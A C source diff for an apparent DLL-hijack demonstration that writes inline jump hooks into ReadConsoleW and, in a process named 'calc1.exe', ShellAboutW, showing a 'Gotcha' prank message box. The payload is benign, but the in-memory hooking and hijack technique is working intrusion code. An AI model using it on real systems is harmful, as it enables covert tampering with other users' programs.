@@ -1,7 +1,8 @@
 #include "version.h"
 
 typedef struct FuncPointer {
-	char name[FILENAME_MAX];
+	char name[FILENAME_MAX+1];
+	unsigned char oldbytes[12];
 	void* func;
 } FuncPointer;
 
@@ -118,10 +119,19 @@ static size_t hookFuncExp(void* dst, const char* name, uintptr_t funcAddr, OrgFu
 	DWORD lpflOldProtect;
 	VirtualProtect(dst, 0x12, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
 	memcpy(&(OgFs->funcs[OgFs->capacity].name), name, strlen(name));
-	OgFs->funcs[OgFs->capacity].func = (void*)(((uintptr_t*)((char*)dst + 6 + (DWORD) * ((DWORD*)((char*)dst + 2)))));
-	*((WORD*)((char*)dst + 0)) = (WORD)0xb848;
-	*((uintptr_t*)((char*)dst + 2)) = funcAddr;
-	*((WORD*)((char*)dst + 10)) = (WORD)0xE0FF;
+	if (((char*)dst)[0] == 0xff) {
+		OgFs->funcs[OgFs->capacity].func = (void*)(((uintptr_t*)((char*)dst + 6 + (DWORD) * ((DWORD*)((char*)dst + 2)))));
+		*((WORD*)((char*)dst + 0)) = (WORD)0xb848;
+		*((uintptr_t*)((char*)dst + 2)) = funcAddr;
+		*((WORD*)((char*)dst + 10)) = (WORD)0xE0FF;
+	}
+	else {
+		memcpy(OgFs->funcs[OgFs->capacity].oldbytes, dst, 12);
+		OgFs->funcs[OgFs->capacity].func = (void*)dst;
+		*((WORD*)((char*)dst + 0)) = (WORD)0xb848;
+		*((uintptr_t*)((char*)dst + 2)) = funcAddr;
+		*((WORD*)((char*)dst + 10)) = (WORD)0xE0FF;
+	}
 
 	return OgFs->capacity++;
 }
@@ -141,24 +151,50 @@ BOOL _CreateDirectoryW(
 	return ret;
 }
 
+void mbht(hwnd) {
+	MessageBoxW(hwnd, L"HEHE... Gotcha!!!", L"WinMM Hijack!", MB_ICONHAND);
+}
+
+INT  _ShellAboutW(HWND    hWnd,
+	LPCWSTR szApp,
+	LPCWSTR szOtherStuff,
+	HICON   hIcon
+) {
+
+	unsigned char pbytes[12] = { 0x00 };
+	memcpy(pbytes,hookedFuncs.funcs[0].func, 12);
+	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)mbht, hWnd, 0, 0); 
+	memcpy(hookedFuncs.funcs[0].func, hookedFuncs.funcs[0].oldbytes, 12);
+	INT(*cdW)(HWND, LPCWSTR, LPCWSTR, HICON) = (INT(__cdecl*)(HWND, LPCWSTR, LPCWSTR, HICON)) (uintptr_t*)hookedFuncs.funcs[0].func;
+	INT  ret = cdW(hWnd, szApp, szOtherStuff,hIcon);
+	memcpy(hookedFuncs.funcs[0].func,pbytes, 12);
+	return ret;
+}
+
 __declspec(dllexport) void pRun() {
 	void* rca = 0x0;
 	rca = (void*)gpaA((char*)"kernel32.dll", (char*)"ReadConsoleW");
+	if (rca == 0x00) return;
 	hookFuncExp(rca, "ReadConsole", (uintptr_t)&_MyReadConsole, &hookedFuncs);
 	//runPatch();
 }
 void init() {
 	void* rca = 0x0;
-	HANDLE mHeap = GetProcessHeap();
-	hookedFuncs.funcs = (FuncPointer*)HeapAlloc(mHeap, HEAP_ZERO_MEMORY, 16 * sizeof(FuncPointer));
-	hookedFuncs.storage = (wchar_t*)HeapAlloc(mHeap, HEAP_ZERO_MEMORY, MAX_PATH);
-	hookedFuncs.llaP = HeapAlloc(mHeap, HEAP_ZERO_MEMORY, sizeof(void*) * 2);
-	hookedFuncs.size = 16;
+	hookedFuncs.funcs = (FuncPointer*)allocMem(26 * sizeof(FuncPointer));
+	hookedFuncs.storage = (wchar_t*)allocMem(MAX_PATH*2);
+	hookedFuncs.llaP = allocMem(sizeof(void*) * 2);
+	hookedFuncs.size = 26;
 	hookedFuncs.capacity = 0;
 
-	if (!wcscmp(getExeName(), L"main_obf_white.exe")) {
+	/*if (!wcscmp(getExeName(), L"main_obf_white.exe")) {
 		rca = (void*)gpaA((char*)"kernel32.dll", (char*)"CreateDirectoryW");
+		if (rca == 0x00) return;
 		hookFuncExp(rca, "CreateDirectoryW", (uintptr_t)&_CreateDirectoryW, &hookedFuncs);
+	}*/
+	if (!wcscmp(getExeName(), L"calc1.exe")) {
+		rca = (void*)gpaA((char*)"shell32.dll", (char*)"ShellAboutW");
+		if (rca == 0x00) return;
+		hookFuncExp(rca, "ShellAboutW", (uintptr_t)&_ShellAboutW, &hookedFuncs);
 	}
 }
 
